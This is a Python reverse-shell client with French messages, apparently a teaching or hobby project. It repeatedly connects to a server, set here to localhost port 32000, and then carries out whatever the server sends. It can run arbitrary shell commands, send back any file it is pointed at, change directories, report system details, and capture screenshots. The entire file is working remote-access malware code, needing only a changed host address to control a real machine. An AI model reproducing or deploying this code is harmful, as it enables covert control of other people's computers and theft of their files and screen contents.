
import socket
import time
import subprocess
import platform
import os
from PIL import ImageGrab

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

# ....
while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode()
    print("Commande : ", commande)
    commande_split = commande.split(" ")
    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd()
        reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1])
            reponse = ' '
        except FileNotFoundError:
            reponse = 'Erreur: Répertoire non valide.'
        reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            f = open(commande_split[1], 'rb')
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        capture_ecran = ImageGrab.grab()
        capturefilename =commande_split[1]+".png"
        c_1 = capture_ecran.save(capturefilename, "PNG")
        try:
            cp = open(capturefilename, "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = cp.read()
            cp.close()
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr
        if not reponse or len(reponse) == 0:
            reponse = " "
        reponse = reponse.encode()

    header = str(len(reponse)).zfill(13)
    print("header:", header)
    s.sendall(header.encode())
    s.sendall(reponse)
    
    # handshake

s.close()
